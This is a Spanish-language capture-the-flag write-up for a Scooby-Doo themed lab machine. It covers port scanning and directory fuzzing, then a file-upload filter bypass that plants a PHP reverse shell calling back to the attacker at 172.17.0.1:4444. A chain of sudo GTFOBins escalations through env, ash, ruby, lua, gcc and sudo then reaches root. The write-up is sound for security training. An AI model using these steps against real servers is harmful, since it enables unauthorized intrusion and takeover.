
## 1. Reconocimiento

Escaneo de puertos y versiones:

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG allports
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
```

Solo el 80. La portada es una web estática con la historia de Scooby, nada aprovechable en el HTML. A fuzzear.

---

## 2. Enumeración web

```bash
gobuster dir -u "http://172.17.0.2" \
  -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -b 404,403
```

Salen /themes y /javascript. Dentro de /themes hay un /uploads vacío, así que buscamos el punto de subida añadiendo extensiones:

```bash
gobuster dir -u "http://172.17.0.2/themes" \
  -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,zip,html,xml -b 404,403
```

```
/uploads       (Status: 301)
/upload.php    (Status: 200) [Size: 0]
/archivo.html  (Status: 200) [Size: 3380]
```

El archivo.html es un formulario de subida que apunta a upload.php y dice aceptar solo .jpg:

```html
<form action="upload.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file" accept=".jpg,.jpeg" required>
```

El filtro es solo por extensión en el nombre, así que se puede camuflar una shell PHP.

---

## 3. Foothold — subida de shell camuflada

Copiamos la reverse shell de PHP con doble extensión para colar el .jpg, y le ponemos nuestra IP y puerto:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php.jpg
nvim shell.php.jpg
```

Dentro de la shell, los datos del listener (la IP del host Docker):

```php
$ip = '172.17.0.1';
$port = 4444;
```

La subimos por el formulario y el servidor nos devuelve la ruta en /themes/uploads/. Ponemos el listener y accedemos al fichero subido para dispararla:

```bash
nc -lvnp 4444
```

Cae la shell como www-data:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Escalada de privilegios — la cadena de sudo

En /etc/passwd vemos a toda la pandilla:

```
daphne:x:1000:1000::/home/daphne:/bin/sh
vilma:x:1001:1001::/home/vilma:/bin/sh
shaggy:x:1002:1002::/home/shaggy:/bin/sh
fred:x:1003:1003::/home/fred:/bin/sh
scooby:x:1004:1004::/home/scooby:/bin/sh
```

La mecánica es siempre la misma: sudo -l muestra que el usuario actual puede ejecutar un binario como el siguiente sin contraseña, y ese binario permite spawnear una shell (GTFOBins). Se encadena salto a salto.

### www-data → daphne (env)

```bash
sudo -l
# (daphne) NOPASSWD: /usr/bin/env
sudo -u daphne env /bin/bash -p
```

### daphne → vilma (ash)

```bash
# (vilma) NOPASSWD: /usr/bin/ash
sudo -u vilma ash -p
# estabilizar:
script /dev/null -c bash
export TERM=xterm
```

### vilma → shaggy (ruby)

```bash
# (shaggy) NOPASSWD: /usr/bin/ruby
sudo -u shaggy ruby -e 'exec "/bin/bash"'
```

### shaggy → fred (lua)

```bash
# (fred) NOPASSWD: /usr/bin/lua
sudo -u fred lua -e 'os.execute("/bin/sh")'
```

### fred → scooby (gcc)

```bash
# (scooby) NOPASSWD: /usr/bin/gcc
sudo -u scooby gcc -wrapper /bin/sh,-s x
```

### scooby → root (sudo)

El último es el más gracioso: scooby puede ejecutar el propio sudo como root, así que basta con pedir una bash:

```bash
# (root) NOPASSWD: /usr/bin/sudo
sudo -u root sudo bash -p
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Root conseguido:

```
root@f1a924982621:~# ls -a
.  ..  .bash_history  .bashrc  .local  .mysql_history  .profile
```

---

Referencia útil para la cadena: cada binario está documentado en https://gtfobins.github.io bajo la sección "sudo".
